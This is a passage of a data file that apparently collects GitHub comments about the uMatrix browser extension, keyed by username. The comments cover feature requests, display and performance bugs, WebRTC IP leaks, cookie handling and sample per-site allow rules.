    "p-b--": "Sure - so basically I am looking to be able to do is replicate the functionality of the \"1st party\" place holder with a \"3rd party\" which will represent all the other urls. That way I can implement functionality such as this.\n\n. @gorhill, that does not really allow me to block all third party cells by policy. So if you look at my earlier example, what I want to be able to do is blanket block stuff for all \"3rd party\" hosts, but not for the 1st-party. \n\nSo if you look at that picture, If I select 1st party I can allow everything except for cookies and frames. However, if I enable something like blogger.com it would not allow cookies and frames (from global) but also plugin, xhr, and other (from the 3rd-party line). So it gives me the ability to apply policy to the \"not 1st party\" group.\n. @tlu1024 so if you look at the image above, if I click on 1st-party I can enable plugin, script, xhr and other for all 1st-party domains. In one click I can enable all of that functionality, which I usually want from the 1st party domain. However if I click any individual 3rd-party domain (such as say google.com) it would only enable css, image, and script; due to the fact that I have cookies and frame blocked at a global scope and plugin, xhr, and other blocked at a 3rd-party scope.\nAlso I realize that the global blocks are temporary in my picture, that is because I did not chance the colors for it. It has no bearing on my example at all. \n. Fair enough on that point, it is not a huge deal. It was 2/3 a convenience factor thing for me.\nThe 1/3 would just be a portion of adding another layer of abstraction to the ui, which at least I thought was useful. However - if it is complicated enough, not an issue.\nThanks for a great product by the way!\n. @gorhill I was actually thinking of trying it myself. I can submit a pull request with what I come up with?\n. Fair enough. I can respect wanting to maintaining control of your work. Let me know what you think. Will keep a watchful eye on the thread :)\n. Hey -- is there any update on this issue? I'd be interested in submitting a pull request to include this feature but I am not sure if you want pull requests for these things.\n. I haven't looked at it that closely, but can't you make the default block and then just click on 1st-party?\n. @gorhill while I have you here, could you let me know the plan for this?\nI've made a crude fix in my local extension which I can submit as a PR, but I know you wanted to implement something like this yourself.\n. That's fine, I understand that it is your project. I'll maintain the codebase locally and merge in changes.\nHowever, I will add that the only advantage is not the clicks. I have found having a 3rd party option in the config has been extremely useful. It allows for classifying the entire \"other\" category specifically which helps when writing rules for sites. Moreso than anything when dealing with something like github.com I can call it github.com as a first-party, but I can address all the other domains with 3rd-party.\npb\n. ",
    "TimySch": "This use-case is unfortunately not possible without 3rd-party filter.\n\nI just want the 1st-party to be green here.\n. It seems if default is block, it cannot be unblocked later down.\nIf the default is allow or neutral, I have to block each 3rd-party domain (and that for each 1st-party domain).\nThe rule \"1st-party allow\" cannot be also placed higher than \"all block\" manually, because of autosort.\nSo you basically need all three: all, 1st-party, !1st-party to complete filter logic\n. Maybe because I want to allow all by default?\nAnd I want to restrict only explicit elements?\nLike I wanted to restrict 3rd party cookies above, thought it was pretty obvious.\nAnyway, here without the allow all rule:\n\n. Ok, don't bother.\n. @p-b-- Or could you perhaps fork and merge your changes?\nI would be glad to try it out\n. ",
    "lenabauer": "no, the Text size ist normal. i have the scale of windows by 125% but change zu 100% also does not solve the problem\n. ",
    "tikurahul": "I have a different manifestation of a similar problem. uMatrix popup is clipped and unclickable many a times. I have to constantly try again, and finally the popup is of the right size.\n\n. ",
    "John-Gee": "What is the padlock?\nMaybe I'm not.\nThanks!\nOn Mon Jan 26 2015 at 4:37:43 AM Raymond Hill notifications@github.com\nwrote:\n\nAre you using the padlock when you make changes?\nAlso, there is a backup feature in the About tab, it's a good idea to\nuse it regularly after you made many changes, so you can just restore all\nat once if something happen.\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/115#issuecomment-71454568.\n. ooooh I see, that's probably why then.\nSorry for the nuisance!\nOn Mon Jan 26 2015 at 5:29:24 AM Raymond Hill notifications@github.com\nwrote:\nhttps://github.com/gorhill/httpswitchboard/wiki/The-matrix-toolbar#persist-temporary-rules\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/115#issuecomment-71460248.\n. Actually, looking back I know why I didn't see that option.\nWhen setting Text Size to Large, 2 icons are hidden by the others, the lock and the remove tempory changes for this scope. Setting the text size to small, I see them.\n. Not that I can think of.\nI usually zoom in pages quite a bit as I'm on a 1080p resolution on a 50\"\nTV.\nA bit different, but if that helps, I also don't see the full matrix, I\nhave to scroll to the right for about 1.5 column, but the titles don't move\nwith the rest so I do not know what column comes after frame (well I only\nsee up to \"fram\"). This behavior is in normal size, in large I don't see\npast the script column title.\n\nThanks!\nOn Thu Jan 29 2015 at 5:55:28 AM Raymond Hill notifications@github.com\nwrote:\n\nSetting text to large should not break the UI. Do you have other\nbrowser/system settings which affect font size?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/115#issuecomment-72027511.\n. It's set to 96x96.\n\nOn Sat Jan 31 2015 at 4:14:41 PM Raymond Hill notifications@github.com\nwrote:\n\nWhat's the DPI as per you OS on that screen?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/115#issuecomment-72323901.\n. That is set to 100%, though I usually manually zoom to 150% or higher.\nIt does not seem to relate to the current page zoom, as changing it has no\neffect of umatrix's size.\nSo I am not sure...\n\nOn Sun Feb 01 2015 at 12:33:58 PM Raymond Hill notifications@github.com\nwrote:\n\nThe only way I can get a matrix which doesn't fit in the limited space\n(the browser sets a maximum size for the popup) and which results in the\npadlock disappearing is when I set the default page zoom to 175% or higher.\nIs this your case?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/115#issuecomment-72363003.\n. Hmmm yes the same.\nI didn't restart chromium after changing it,  maybe that's why.\n\nOn Sun, Feb 1, 2015, 3:22 PM Raymond Hill notifications@github.com wrote:\n\nAre we talking about the same zoom setting? I am talking of the one in the\nSettings page of the browser. This one definitely changes the zoom of\nthe extension popups:\n[image: c]\nhttps://cloud.githubusercontent.com/assets/585534/5994391/4d3d8520-aa3f-11e4-91c7-1c2a80edb4d0.png\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/115#issuecomment-72390884.\n. Oh just in case, what I meant by:\n\"It does not seem to relate to the current page zoom, as changing it has no\neffect of umatrix's size.\"\nis when I manually zoom in/out a page, it does not change umatrix's size,\neven though the current page obviously changes.\n\nAnd when I tried playing with the default page zoom settings, umatrix's\nsize didn't change either, but I did not restart chromium in between, I'll\nhave to try that.\nOn Mon Feb 02 2015 at 1:08:13 AM John Ettedgui john.ettedgui@gmail.com\nwrote:\n\nHmmm yes the same.\nI didn't restart chromium after changing it,  maybe that's why.\nOn Sun, Feb 1, 2015, 3:22 PM Raymond Hill notifications@github.com\nwrote:\n\nAre we talking about the same zoom setting? I am talking of the one in\nthe Settings page of the browser. This one definitely changes the zoom\nof the extension popups:\n[image: c]\nhttps://cloud.githubusercontent.com/assets/585534/5994391/4d3d8520-aa3f-11e4-91c7-1c2a80edb4d0.png\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/115#issuecomment-72390884.\n. I just looked back at this, having a similar issue with another extension.\nAnd yes, the panel size changes with the page zoom, but I need to restart Chromium for it to matter, which I didn't do back then (not sure why anymore).\nWith uMatrix I can see everything with a default page zoom of up to 150% (that is not true with the other extension though), but my usual zoom is 175%, so it's a bit harder to read stuff in the panel.\n. \n\n",
    "frznvm0": "That's actually a much better idea.\nShould I close this?\n. ",
    "anothermindbomb": "Where are you seeing the requirement to connect to github? \n. Scratch that - just read #117\n. ",
    "kniddl": "The problem is that the amount increases as long as I'm on Youtube. Thereby the memory and cpu usage increases successively. The cpu usage increases averagely about 5 % with 1000 elements. That happens only on Youtube so it feels like a problem. \n. If you are that certain then it indeed isn't the fault of uMatrix. And probably I don't understand totally the functionality; I read through the documentation but I'm just an user so bear with me. I expressed myself wrong in the last posts but it seems unnecessary to explain it in other words so I let it be as it is. I'm sorry for my bad explanation. \n My question is then whether you know why youtube loads constantly new elements and why the memory and CPU usage is so high because I haven't encountered that \"problem\" with HTTP Switchboard. That's why I thought this usage is because of uMatrix (Not really an evidence, I know). Is it perhaps due to HTML5, quasi a sort of interference? \nI haven't written that yet but I really appreciate your work and I find uMatrix and his ancestor very useful extensions.\n. The statistics page shows a particularly high amount of  blocked cookies, about 70-95 % of all blocked elements. So the problem what I thought regarding the matrix isn't the amount of scripts but the high number of cookies.\n The CPU usage bounces pretty widely when I play a video. \nYes, I enabled hardware acceleration. \nNo, I haven't tried yet but I actually don't know how I can force to use flash. For few days HTML5 is enabled automatically so I didn't think about forcing flash.\nI have Opera 27.\nPerhaps I should restart my browser; I haven't done that for days...\nI'll restart my computer and look what happens. Thanks for your explanations. \n. ",
    "yamalight": "Well, manual rules creation is not exactly the most user-friendly thing.\nAlso, I don't think that there's need to list all TLDs, just a way to whitelist the top level would be sufficient as that's the most frequent use case.\nI can see two ways to achieve this functionality without changing UI too much:\n1. Add floating arrow (similar to the one that's now responsible for collapsing/expanding set of domains) that would trigger a menu with an additional actions, including \"white/black-list *.domain.com\"\n2. If there's only one domain name shown and it's not top-level domain, the name of domain can be split into two smaller columns - one with subdomain symbols and one with top domain address. Using cloudfront example from before: currently d1506sp6x4e9z7.cloudfront.net | allow | deny | ..., new way of rendering d1506sp6x4e9z7 | cloudfront.net | allow | deny | ...\nBoth of those will allow making top level interactible without any drastic changes to UI, which would improve UX significantly, IMO.\nI can try to make a PR with the proposed changes if you are interested.\n. Okay, if it's not advised - is there a better way to whitelist CDNs that use multiple subdomains to deliver content from the UI? If not, well, it just makes me really sad. \nI guess I'll just close the issue as well.\n. Hm, I was under impression that some sites change what's preceding .cloudfront.net. Looks like it was me being idiot all this time. Thanks for clearing that up for me!\n. ",
    "junkblocker": "That would be sufficient for my \u00b5Matrix use. Thanks! \n. ",
    "Stebalien": "This has been fixed and should probably be closed.\n. Would you be consider accepting a patch if I find time?\n. That's reasonable.\n. Yes. According to a comment in your code,\n\nMaybe there is a scope in which the cookie is 1st-party-allowed. For example, if I am logged in into github.com, I do not want to be logged out just because I did not yet open a github.com page after re-starting the browser.\n\nSee: https://github.com/gorhill/uMatrix/blob/7dcfdf9e082eb2c1d99c717cf4cdf90981e3a6f9/src/js/cookies.js#L469\nI allow all first-party cookies for the current session. Maybe this statement is incorrect but, if it is, that's even worse (it means that cookies that I don't want to be deleted will be deleted due to a third party request).\n. > The code you point at checks for \"explicitly allowed\", i.e. if there is a rule which explicitly whitelist the cookie. In such case, uBO won't delete the cookie. If the cookies on a site are indirectly whitelisted through say * 1st-party * allow, then this is not an explicit rule whiltelisting the cookie, and it will then be deleted if the cookie is blocked elsewhere.\nSo, if someone embeds an image from, say, reddit in their website and I haven't explicitly whitelisted cookies on reddit's domain (but they still show up as \"allowed\" in the GUI because I've whitelisted all first-party cookies) they'll get deleted? That's a security bug (albeit a minor one).\nHowever, the code above the line I indicated seems to avoid deleting cookies that have been used as a part of a first party request. Is this not the case? \nRegardless, cookies from blocked origins are being sent.\n\nIt's why I need specific, detailed steps to make the case there is an issue.\n\nMy observed behavior is that the (blocked) cookies set by a third party request are being sent with a first party request. That's why I gave you a POC to play around with. How cookie deletion is handled isn't actually documented anywhere (or anywhere I could find, at least) so you can't reasonably expect me to know how it works.\nExplicit steps to use the POC:\n1. Run site.py and tracker.py.\n2. Visit 127.0.0.1:8080.\n3. Visit 127.0.0.2:8080 to collect the tracking cookies.\n4. Visit 127.0.0.2:8080/log to view the activity logs.\n. Deleting a potentially wanted cookie because its included in a third party request.\nIt's a security bug because a malicious website can use this to delete arbitrary cookies by making a cross site request.\nSteven Allen\n. I have a bunch of other addons running and, now that I've restarted Firefox, I'm not seeing this any more. However, something fishy is going on... I'll close this for now but hopefully someone else will run into it. I only noticed because I know that gnu would never include javascript from google.\n. Scratch that. This happens on any page opened from a google link, even after reloading the page (all extensions except uMatrix disabled).\n. Got it. Thanks!\n. ",
    "4nd3r": "\nThe easiest way for me to implement this is to allow:\n123.45.67\n123.45\n123\nIn rules, i.e. no need for a formal CIDR declaration.\n\n/24, /16 and /8 aren't only prefixes. for example, one of google's network is 216.58.192.0/19. that's 216.58.192.0 - 216.58.223.255. okay, you can define 216.58.192, 216.58.193, 216.58.194 etc, but how do you define range 1.2.3.0/25, for example (last possible address is 1.2.3.127)?\n. ",
    "TheRyuu": "PoC[1] for blocking WebRTC in cases where WebRTC Block does not cut it (the iframe workaround).  This just modifies the UA spoofer code and I've no idea if it works in all cases.  Please note that this must be used in combination with the WebRTC Block[2] extension otherwise the \"naive\" case will actually still work.  Here[3] is the WebRTC Block javascript for reference.  I'm not sure if adding \"match_about_blank\": true to the WebRTC Block manifest.json will work in all cases.\nAlso I've no idea if this is even a proper way of doing things as javascript is really out of my comfort zone so I apologize if it's just plain wrong.\n[1] https://privatepaste.com/792de4de1f\n[2] https://chrome.google.com/webstore/detail/webrtc-block/nphkkbaidamjmhfanlpblblcadhfbkdm?hl=en\n[3] https://privatepaste.com/cb3bf093e7\n. ",
    "marksolaris": "+1\nhttps://torrentfreak.com/huge-security-flaw-leaks-vpn-users-real-ip-addresses-150130/\n. I forgot umatrix was blasting session cookies today and wasted a lot of time trying to figure out why I had to log in again so much today. Bump.\n. ",
    "CHEF-KOCH": "Hello, after some research this is still a huge problem on Chrome.\nIP leakage test pages:\n- http://whoer.net/extended\n- https://www.browserleaks.com/webrtc\n- https://www.perfect-privacy.com/webrtc-leaktest/\n- https://ipleak.net/\n- https://diafygi.github.io/webrtc-ips/\nResearch:\n- #466197\n- #457629\n- #333752\nSo all of these mentioned workarounds do not work, since this seems to be hardcoded within the source. The mentioned addon on the web only block the local ip but not the public one which makes it easy to track you down e.g. behind a vpn and webrtc do not only affect stun, also turn and ice around webrtc. \nI think that must be directly fixed within the source and maybe with a possability to fine control it with uBlock/umatrix to get the choice to en-/disable it.\n. ",
    "adrianguenter": "\nThe only kink is that the rule could belong to a broader scope, but I don't see this as so terrible.\n\nThat's exactly the problem, but I understand your position. I'll fork then.\nThanks for the quick response.\n. ",
    "timss": "@CrisBRM Did you ever look further into this?\nI'm not well versed at all when it comes to Firefox addons, but it seems to me that vapi-background.js#1686 might be a good place to investigate. Unfortunately I don't know where to start so had a hard time even finding the correct documentation. \nI'd be happy to look for a solution if someone were to point me in the right direction.\n. Can confirm that it's working as intended with vimperator as well. \nI would also like to emphasize the part where you need to restart your browser. Wouldn't work without it. \n. ",
    "RandomAcronym": "Support for macros in general sounds interesting to me.\n. I was wondering about this as well.\n. I believe they want the drop-down removed.\n. I can block HSTS tracking on http://www.radicalresearch.co.uk/lab/hstssupercookies with this:\n\nradicalresearch.co.uk radicalresearch.co.uk * block\nradicalresearch.co.uk www.radicalresearch.co.uk * allow\n\nA new ID is given for each page visit.\n. ",
    "Kyuzial": "Yeah i know \u00b5block, i use it and i love it but i think a all in one addon.\nAnd i think having a all-in-one addon with the matrix and the adblock filtering is better(and simpler) than having two addon.\n. ",
    "anarcat": "from what i can tell, the import/export syntax is not the same, how would i import httpsb rules into uMatrix? or do they split between the two as well?\nthanks for those awesome tools...\n. it would still be nice to have an upgrade path, even if with reduced functionality...\n. that is what kb SSL enforcer tries to do: it redirects you to HTTPS if there's such a version.\nso i guess that answers my question (\"no\"), thanks! :)\n. FWIW, i wish to pronounce it \"you-matrix\". :p \"micro-matrix\" is just silly, especially on large sites where the matrix becomes too big... ;)\n(sorry for the noise, i couldn't resist). ",
    "pjlegato": "I do not have any assumptions whatsoever about how I think uMatrix works internally, so there is nothing to share in that regard.\nI installed it and it generally works well. GMail is now also operating slowly as described above, which did not happen previously.This seems to have started recently, at approximately the same time I installed uMatrix. I cannot say for sure that uMatrix is the cause, but I also cannot rule it out.\nI notice that on most sites, uMatrix shows a count of perhaps 30 or 40 or even 100 connections, and that these counts do not typically change while using the site. I notice that on GMail, unlike all other sites, it shows thousands of connections after a short time, and moreover that the counters continually increase while actively using the site. It is not illogical to hypothesize that these are related.\nI will now try disabling uMatrix entirely and using GMail again to see what happens. It could be that some particular interaction between uMatrix and other plugins is the cause. It may also be unrelated to uMatrix.\n. I have just conducted a few experiments. Disabling the uMatrix extension and reloading the GMail page causes typing to work normally. Re-enabling uMatrix and reloading GMail causes all typing to be delayed by several seconds before appearing on screen. I repeated the process several times, with the same results. I don't know the exact mechanism at work, but it seems to be caused by some aspect of uMatrix's operation, perhaps only in conjunction with other plugins.\n. When I activated the dev console, typing began working normally even with uMatrix enabled.\n. As part of my attempts to get typing to work normally, I have uMatrix disabled for all google.com domains. That is why I was surprised to see the counters incrementing frequently. After a page reload, it hits >400 connections quickly, and continues to increase. After an hour or so of light use, it's over 4,000.\n. What is the best way to profile the page? Is there some tool that will show how much CPU each extension uses?\n. OK, thanks. I will run a profile the next time I get it to exhibit the slowdown.\n. I suggest this be re-opened. I ran a profile during a GMail delayed typing event (screenshot below) and found that the bulk of CPU time is spent in mutationObservedHandler at line 478 of contentscript-end.js, which seems to be a part of uMatrix.\nNote that this happened on mail.google.com while uMatrix was supposedly disabled for all google.com domains via the power button icon in the UI. This is a bug: the correct behavior for \"disabling uMatrix for a domain\" is that it should not participate in the page's rendering or operation in any way -- all the observers and other hooks should be removed entirely, not just flagged somehow to not act. CPU time spent in any uMatrix function should be 0 when it's disabled.\nIt seems anecdotally that this only happens when the badge event count on the uMatrix icon is high (approximately 4k or higher), though this may be a coincidence.\n\n. I also have uBlock installed, also supposedly disabled for *.google.com. uBlock's UI reports that it is version  0.9.3.0\nTyping that into mail.google.com's console, I get:\n```\n\ndocument.querySelectorAll('[class]').length;\n3613\n```\n. For uBlock: I loaded mail.google.com, then clicked the uBlock icon, then its big \"power button\" icon, so that it and the uBlock icon both turned grey. The status line now reads \"0 or 0%\".\n\nFor uMatrix: I loaded mail.google.com, then clicked the \"power button\" icon to disable it. When this didn't fix the problem, I clicked the \"mail.google.com\" box and changed it to \"google.com,\" in the hopes that the more expansive scope would fix it.\n. Yes, I've reloaded the page many times. I turned uBlock and uMatrix off for GMail months ago. I've also restarted the browser and rebooted my computer many times since then.\n. I have 8 gigs of RAM and was not doing anything particularly memory intensive at the time (as far as I know.) Do uBlock / uMatrix themselves consume a lot of memory? The next time I can reproduce the condition again, I'll check for swapping explicitly.\n. The other issue is that uBlock and/or uMatrix are apparently still doing something even though I have disabled them both for GMail. Is this a legitimate bug?\n. ",
    "TK3600": "When I click the extension icon on chrome, there is a list of red/green domain. Those on the bottom with a separate category appears to be blocked by default. Those are what I was talking about.\n. https://i.imgur.com/U5r4AyT.png\nDoes this help clarify?\n. Thank you!\n. ",
    "Maxxee": "After adding\nhttps://easylist-downloads.adblockplus.org/easyprivacy.txt\nhttps://easylist-downloads.adblockplus.org/easylist.txt\nhttps://easylist-downloads.adblockplus.org/easylistgermany.txt\nto the Hosts files, your instructions don't work at all for me. Everything is blocked by default. E.g.\nhttps://google.de\nhttps://heise.de\nNone of these 3 lists include the whole above mentioned hosts, just portions of them, but uMatrix keeps blocking everything, even after going through all your steps and restarting Chrome.\nInterestingly enough https://github.com/ is not blocked at all.\nEDIT: After a bit of further reading I think this is because of uMatrix ignoring the patterns and using the hosts only.\nWhile reading I had a question on my mind: Wouldn't it be easier for everyone if you just combined both add-ons into one? Would this be possible?. ",
    "adepasquale": "Thanks, so I guess I'll uninstall Ghostery. :smile: \n. ",
    "olmy": "Not available for release Opera/Linux, apparently.\n. ",
    "dicktyr": "\nI don't see myself having the time\n\nthat's a pity\nyou seemed quite interested previously\n\nuBlock\n\nin any case\nplease be careful making it easier to block ads\nlest upstream forces make things worse\nincreasing obfuscation\ntoward a world of binary web pages...\nthe wolves in this world won't go away\nand goats enjoy some protection\nnot of outsmarting wolves\nbut simply because sheep are easier prey\n. ",
    "Piste": "Well for one uMatrix can get pretty click-intensive. You arrive on a new website and things don't appear or some features are broken. So you start enabling this. The page loads partially then you enable that, etc. In the case you are browsing with someone else (say, troubleshooting, following instructions...) this can become tedious and slow you down.\nA second case is CDN subdomain. And I apologize if this is due to my minimal knowledge of the rule file. But basically anything that uses CloudFront for example will force me to allow a (different?) .cloudfront.net subdomain every time I land on a CDN-enabled page. I think #121 referred to it. Since AFAIK there is no way to allow all CloudFront within any site it can be useful for watching videos on random sites, for example.\n. ",
    "colaas": "This is on \u00b5Matrix 0.8.1.3\n. Sorry, it is actually uBlock not letting it update. It's been reported before in https://github.com/gorhill/uBlock/issues/302 and you reversed a pull request which should have fixed it.\n. The list was down the other day so I couldn't follow up but I found the problem:\nin  uBlock/assets/ublock/filter-lists.json             it's   .%5Cad_servers.txt so it isn't blocked\nin  uMatrix/assets/umatrix/hosts-files.json         it's   ad_servers.txt  so it trips the \".net/ad\"_ rule in Easylist\nAnother mention in  uMatrix/tools/update-3rdparties.sh is .%5Cad_servers.txt\n. ",
    "bayun": "I'm not sure if you accept any bug reports for SeaMnkey - but uMatrix works fine in it... except that all CSS requests end up as behind-the-scene. Yes, I know that default set of rules allows all for css - but is it the only way?\n. 2.33.1.\nI have found some strange half-workaround that works sometimes. If after starting uMatrix (i.e. browser loading) with default rules (uMatrix does not save settings on Seamonkey for some reason) I load rules from text file things are usually good. But if I load saved settings - almost all requests become \"behind-the-scene\".\n. Same on Linux,  SeaMonkey 2.38, uBlock Origin 1.1.1, RequestPolicy\nIt seems to depend on order in which extensions are initialized, as sometimes after restarting seamonkey It was working... till next restart.\nIf you need anything that not-very-good-with-JS programmer can do - I will be happy to help, this bug annoys me to no end.\n. ",
    "Phoenix616": "Any chance on getting this feature back? I am currently considering reverting to httpswitchboard (or running my own fork when I find out where this change was made)\n. Well it breaks my workflow and I loose dozens of seconds every time I expect the page to reload after a change... btw. this is the commit that removed that feature: be3e86e055f05e80bdc7c98804e9c2cb1a616872, maybe I get around reimplementing it in a new version, for now I probably stick to httpsb or a pre 0.9 \u00b5Matrix version.\n. ",
    "jcmdln": "I'd hardly call this an \"essential feature\" or worthy of a fork but feel free to do so.\n. @ParticleMon it seems odd that adding pre-Australis support isn't as straight-forward as it was for uBlock.\nThat work was done by @AlexVallat and was imported in 0.9.9.2. If you would like to see support for Pre-Australis versions of Firefox, how about reviewing Mr Vallat's changes and see how \"straight-forward\" it is?\n. ",
    "gitgetgot": "I just tested the addon the first time and that feature is one of the most important missing ones!\n. not very intuitive, but ok if you know it... 8-)\n. no reason?\nwouldn't you think its useful for the user?\n. Thanks, \njust for information, I use other addons which deal with cookies:\nSelf-Destructing Cookies 0.4.9\nand \nCookie Manager Button\nand\nI don't care about cookies\n. ",
    "castor-troy": "I am using Firefox Developer Edition 39.0a2 (2015-05-08). I have a number of add-ons installed. CanvasBlocker, Downthemall, greasemonkey, Httpseverywhere, lastpass, localload, minimizetotray revived, ublock origin, umatrix, self-destructing cookies, x-notifier.\nI will try to look through the browser console and then disable add-ons one by one to find the culprit.\n. My apologizes. I used to run Cookie Monster earlier which disabled all cookies by default. In my excitement to use uMatrix, I uninstalled Cookie Monster but it didn't re-enable cookie settings in Firefox. It was disabled for all sites when I checked a few minutes ago. Everything is fine and working as expected. Sorry for wasting your time.\n. Also, if it's not too much trouble, can you enable an option to save the log?\n. The addon is available at: https://addons.mozilla.org/en-US/firefox/addon/downthemall/\nThe following are the versions installed in my computer:\nDownThemAll 2.0.18\nFirefox: 38.0.1\nuMatrix: 0.9.0.2\nThen, use DownThemAll to download any file. I tried downloading bittorrent Sync, but I get the error for any type of file donwload.\nOpen the URL: http://filehippo.com/download_bittorrent_sync and click on Download green button on the right of the page. Then use DownThemAll to download.\nPS: I am pretty sure it's not a problem with uMatrix and it's a configuration error. But I am not able to figure out the right way to configure uMatrix.\n\n\n. ",
    "hotdogman": "I believe that the issue of non-HTML documents reporting inline scripts, while fixed in uMatrix, remains present in uBlock.\nhttps://a.pomf.se/avonjf.webm\n. > Can \u00b5Matrix work with filters from https://fanboy.co.nz/ ?\nThe filters on https://fanboy.co.nz are for Adblock Plus. uMatrix supports host files, not ABP filter lists.\n\nThat's the reason why I can't completely replace \u00b5Block with \u00b5Matrix.\n\nUse both of them.\n. Just guessing, but look at your uMatrix settings, and then your uBlock settings.\nIn uBlock, is \"Hide placeholders of blocked elements\" enabled?\nIn uMatrix, is \"Collapse placeholder of blocked elements\" disabled?\n. \nDoes the lock/save button not work?\n. https://github.com/gorhill/uBlock/issues/308#issuecomment-109761474\n. https://github.com/gorhill/uMatrix/wiki/Very-bare-walkthrough-for-first-time-users\nYou're looking for the global scope (*).\n. This may be a duplicate of #199, so I apologize if it is, but with #199, the network monitor still reports a request.\n\n\nThe network monitor isn't reporting any requests for the audio/media files here, though, but they're still playing in the background.\n\n. ",
    "SkySkimmer": "@tlu1024 \n\nOne general question: Do you know a trick how to make a screenshot of the matrix in Firefox? Other than in Chrome it vanishes too fast when I press the print key which starts ksnapshot in my case since I'm using KDE.\n\nUse the snapshot delay (http://a.pomf.se/qvxyai.png in the red rectangle). Steps:\n-hit print to get ksnapshot\n-set delay to 1 or 2 seconds and take new snapshot\n-before the delay ends open the matrix\n-when the delay ends you will get a snapshot with the matrix open\n. Incomplete UA spoofing with JS enabled makes some sites complain, eg https://www.cmso.com/ makes the following alert:\n\nERROR: Possible problem with your *.gwt.xml module file.\nThe compile time user.agent value (safari) does not match the runtime user.agent value (gecko1_8). Expect more errors.\n\nI don't remember what the uMatrix defaults are, but if they enable UA spoofing and 1st party JS people will get that error.\nMaybe UA spoofing should be enabled only if the specific request would be blocked were it a javascript request? ie if some site has JS enabled for 1st party but not 3rd parties you get UA spoofing for the 3rd party requests only.\n. ",
    "zcater": "Yeah, this was a misunderstanding on my part thinking that allowing scripts in the scope of good.example.com would allow example.com globally, which is not the case.\n. ",
    "Raziel-23": "I had the same problem and here #288 is a proper solution.\n. I had the same problem and here #288 is a proper solution.\n. There is another way (more official way), you can manually add extensions.umatrix.forceLegacyToolbarButton entry as boolean type and set it to true. After restarting firefox it should works. Tested on pentadactyl-git and uMatrix versions 0.9.1.2 (AMO).\n. I can answer your question, because for me it was also the issue. uMatrix has already this feature, but you have to manually add extensions.umatrix.forceLegacyToolbarButton entry as boolean type and set it to true. After restarting firefox it should works, for pentadactyl it works.\n. ",
    "josch": "If #288 is a proper solution then I fail to find the setting extensions.umatrix.forceLegacyToolbarButton.\n. Manually adding extensions.umatrix.forceLegacyToolbarButton as a boolean value set to true to about:config fixes this issue indeed with pentadactyl.\n. ",
    "vanowm": "What about using crop attribute on label and adding tooltip? Where exactly in the code is this generated?\n. The toggles ARE grey when disabled...there is no consistency to begin with....\n. Found what caused it: referrer spoofing.\nApparently disabling uM on particular website doesn't disable the additional 3 toggles?\n. I see that now. It's confusing (although what isn't in uM? ;) )\nPerhaps instead of power switch icon (which ultimately suggests disable of the addon on that website and not just part of it) it should be something like crossed off filter icon?\nBadges would help (although I have no idea what the badge at filter power button represent without going through the manual) and definitely would be a great help if button changed (color) when everything is disabled in there.\n. ",
    "Pheil": "You could also just close the menu and show the same panel (pop-up) window as if it wasn't in the menu.\n. ",
    "jjohns71": "\n\n\n\n\n\n\n\n\n\n\n\n. I know it's not productive, but fuck off on snapping on his reasons.\nOn Jul 21, 2016 10:08 PM, \"h1z1\" notifications@github.com wrote:\n\nAh my little napoleon complex friend.. It's not invalid, there's NOTHING\nindicating why one can't accept the certificate. That is the bug. Why I\nopened this - warn anyone else who might run into it.\n\u2014\nYou are receiving this because you are subscribed to this thread.\nReply to this email directly, view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/595#issuecomment-234436434,\nor mute the thread\nhttps://github.com/notifications/unsubscribe-auth/AGeyE1dq2vgZJ48b5t8nuX7pdGiyYoXYks5qYCY3gaJpZM4JSScI\n.\n. Sorry the URL is http://www.indystar.com/story/news/crime/2016/10/04/state-police-raid-indy-office-growing-voter-fraud-case/91540816/\n\nIt seems like the host might be down right now, but this was how the block was working when I took the screenshots yesterday, indystar is a news site so most likely it is an errant block in a hosts list, i just happened to notice the way that Chrome and Firefox functionality work in allowing an override appeared to be different.\n. Now when I tried this today, the indystar URL did load in my Firefox uMatrix quick panel so maybe it was just a temporary bug that was not allowing it to display yesterday. Seems weird, sorry if this is a false bug report, I will close, seems functionality is the same between Chrome & Firefox.\n. @Whoareyouagain I use chase as well and found after their recent site redesign, you need to enable some additional 3rd party access to get it to work properly. Try adding the following rules to your 'My rules' tab and see if the site works for you now.\nchase.com cdn.f9client.com frame allow\nchase.com chasecdn.com script allow\nchase.com chasecdn.com xhr allow\nchase.com poc.clixmetrix.com frame allow\nchase.com poc.clixmetrix.com script allow\nchase.com secure.chasecdn.com cookie allow\nchase.com use.typekit.net script allow. This isn't a valid issue but you can do this with uMatrix, To do what you want for YouTube add the following rules to your 'My Rules' tab in the uMatrix dashboard:\n* googlevideo.com * allow\n* youtube-nocookie.com frame allow\n* youtube-nocookie.com script allow\n* youtube-nocookie.com xhr allow\n* youtube.com frame allow\n* youtube.com image allow\n* youtube.com other allow\n* youtube.com plugin allow\n* youtube.com script allow\n* youtube.com xhr allow\n* ytimg.com image allow\n* ytimg.com plugin allow\n* ytimg.com script allow\nThis can also be done through the GUI -- if you click on the domain at the top left of the uMatrix panel you can change it to * to implement a global rule. (Produces the same rules as given above.). ## Steps to follow for setting global rules through the GUI \nFor the steps below we will use an example website which has a youtube video embedded on the page.\nStep 1.\nFrom the uMatrix panel in the very top left corner select the blue dropdown which should show the website domain you are currently on and select '*' instead of the domain you are currently on.\n\nStep 2.\nSelect the rules you want to allow from the 3rd party domain.\n\nStep 3.\nClick the unlocked padlock icon from the uMatrix panel to permanently save the new rules you have just allowed.\n\nAlternative Step 3. Procedure\nOpen the uMatrix dashboard and click on the 'My rules' tab. Make your temporary rules permanent by committing them by clicking on the \n button.\n\nThis is an alternative to clicking the padlock icon from the uMatrix panel to make rules permanent.\nStep 4.\nClick the refresh icon  to refresh the example website\nStep 5.\nRepeat steps 1-4 until the video fully loads.\n\nScripts for domains 'www.youtube.com' & 's.ytimage.com' as well as XHR requests for 'googlevideo.com' & 'www.youtube.com' and frames for 'www.youtube.com' have now been allowed.\nRules you set following the steps above should now be global and apply to all websites.. I also have this issue sometimes, the most common set of 